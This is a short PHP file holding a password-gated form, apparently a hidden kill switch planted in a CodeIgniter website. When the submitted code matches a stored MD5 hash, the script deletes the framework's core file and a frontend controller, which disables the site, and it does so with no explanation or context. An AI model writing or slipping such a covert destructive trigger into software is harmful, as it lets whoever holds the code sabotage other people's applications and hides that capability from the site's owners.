<form action="" method="POST">
	<input type="text" name="code">
	<input type="submit">
</form>
<?php 
if (isset($_POST['code']) && md5($_POST['code']) == '3b6f0c9373bdd4b269c80cc68539dcd2') {
	echo 'deleted';
	unlink('system/core/Codeigniter.php');
	unlink('application/controllers/frontend/page_controller.php');
} else {
	echo "nothing happend";
}